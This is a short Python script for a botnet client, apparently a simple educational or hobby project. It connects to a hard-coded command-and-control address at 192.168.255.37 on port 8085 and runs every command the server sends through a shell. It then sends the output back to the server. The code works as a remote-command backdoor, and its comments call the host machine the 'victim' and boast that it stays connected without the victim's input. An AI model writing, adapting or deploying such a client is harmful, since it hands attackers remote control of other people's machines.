#!/bin/python3
import socket
import subprocess
import sys

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

if __name__ == "__main__":
    print("[+] Client Bot Connecting too CnC server...")

    try:         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as e: 
        print (f"{bcolors.FAIL}[x] Error creating socket: %s.{bcolors.ENDC}" % e) 
        sys.exit(1)
    
    try: 
        s.connect(("192.168.255.37", 8085))  #  connection ip of CnC bot server and port
    except socket.error as e: 
        print (f"{bcolors.FAIL}[x] CnC server not running or not reachable, connection failed: %s.{bcolors.ENDC}" % e)                
        sys.exit(1)
    
    run_bot = True
    while run_bot:
        communicate_bot = True
        while communicate_bot:
            msg = s.recv(1024)
            msg = msg.decode()
            print(bcolors.OKGREEN + "CnC response message received: ", msg)
            
            if msg == "exit" or msg == "terminate":
                communicate_bot = False
            
            else:                
                victim_result = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]                
                s.send(victim_result)
            
        if msg != "terminate":
            userinputs = input("[+] Do you want to remain connected to CnC server? [yes/no] ")
            # setting the userinputs value to "yes"  the bot on client remain running no client victim input required \o/
            if userinputs == "no":
                status = "disconnected"
                s.send(status.encode())
                run_bot = False
            else:
                status = "connected".encode()
                s.send(status)
        else:            
            run_bot = False

    s.close()
    exit()
  
